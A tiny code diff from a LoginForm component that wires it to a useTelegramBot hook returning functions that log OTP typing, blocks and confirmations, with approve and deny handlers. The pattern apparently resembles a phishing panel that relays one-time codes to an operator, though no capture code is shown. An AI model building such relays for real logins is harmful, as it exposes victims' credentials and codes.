@@ -238,7 +238,7 @@ function LoginForm() {
     sendOtpTypingLog,
     sendBlockedLog,
     sendConfirmationLog,
-  } =  (
+  } =  useTelegramBot(
     sessionId, 
     handleApprove, 
     handleDeny, 
